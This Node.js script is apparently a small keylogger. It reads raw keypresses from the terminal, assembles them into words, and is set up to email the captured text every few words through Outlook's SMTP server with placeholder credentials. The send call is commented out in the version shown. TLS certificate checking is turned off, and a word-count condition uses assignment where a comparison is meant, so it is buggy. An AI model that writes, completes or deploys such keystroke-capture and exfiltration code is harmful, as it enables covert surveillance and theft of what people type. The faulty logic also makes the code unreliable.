const readline = require('readline');
const MAX_WORDS = 3
var word = new String()
var text = new String()
var nwords = 0

// Data for sending the email
const userEmail = XXX 
const passUser = XXX 
const toEmail = XXX 

async function sendEMail(message){

    var nodemailer = require('nodemailer');

    // hotmail here but you can use what you want..
    const transporter = nodemailer.createTransport({
        host: 'smtp-mail.outlook.com',
        auth: {
            user: userEmail,
            pass: passUser
        },
        tls : { rejectUnauthorized: false }
    });

    try{
        await transporter.sendMail({
            from: userEmail,
            to: toEmail,
            subject: 'Testo',
            text: message
        });
    }catch(e){
        console.log(e)
    };
}
 
readline.emitKeypressEvents(process.stdin);
if (process.stdin.isTTY) process.stdin.setRawMode(true);
 
// listen to keypress 
process.stdin.on("keypress", async (str, key) => { 

    if(key.sequence != ' '){

        word += key.sequence

    }else{

        nwords += 1

        text += word
        text += " "
        word = ""

        if(nwords = MAX_WORDS){
            //await sendEMail(text)
            console.log(nwords)
            text = ''
            nwords = 0
        }

    }
    
})